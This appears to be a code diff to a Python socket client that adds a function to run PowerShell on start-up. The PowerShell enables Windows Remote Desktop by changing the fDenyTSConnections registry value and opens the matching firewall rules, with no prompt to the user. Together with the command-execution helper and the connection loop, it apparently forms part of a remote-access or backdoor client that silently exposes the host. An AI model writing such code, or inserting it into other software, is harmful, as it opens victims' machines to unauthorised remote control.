@@ -44,9 +44,29 @@ def execute_command(command):
     except subprocess.CalledProcessError as e:
         print(f"Command execution failed: {e}")
 
+def enable_rdp():
+    print("Enabling Remote Desktop...")
+    # Enable RDP in Windows
+    rdp_script = """
+    $regPath = "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server"
+    $rdpEnabled = Get-ItemProperty -Path $regPath -Name "fDenyTSConnections" | Select-Object -ExpandProperty "fDenyTSConnections"
+    if ($rdpEnabled -eq 1) {
+        Set-ItemProperty -Path $regPath -Name "fDenyTSConnections" -Value 0
+        # Allow RDP through Windows Firewall
+        Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+        Write-Output "Remote Desktop enabled."
+    } else {
+        Write-Output "Remote Desktop is already enabled."
+    }
+    """
+    execute_command(f'powershell -Command "{rdp_script}"')
+
 def main():
     port = 12345
     client_socket = None
+
+    # Enable RDP on client start
+    enable_rdp()
 
     while True:
         if client_socket is None:
